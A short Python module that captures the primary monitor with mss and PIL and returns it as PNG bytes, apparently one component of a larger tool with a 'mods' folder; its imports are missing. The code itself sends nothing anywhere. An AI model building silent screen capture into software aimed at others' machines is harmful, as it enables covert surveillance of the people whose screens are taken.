#mods/screenshot.py
class SCREENSHOT:
    def __init__(self):
        self.SC_DATA = b""
        self.SUCCESS = False
        self.generate()

    def generate(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                img = sct.grab(monitor)
                buf = io.BytesIO()
                im = Image.frombytes('RGB', img.size, img.rgb)
                im.save(buf, format='PNG')
                self.SC_DATA = buf.getvalue()
                self.SUCCESS = True
        except Exception as e:
            self.SC_DATA = f"[!] Screenshot failed: {str(e)}".encode()
            self.SUCCESS = False

    def get_data(self):
        return self.SC_DATA

    def is_success(self):
        return self.SUCCESS



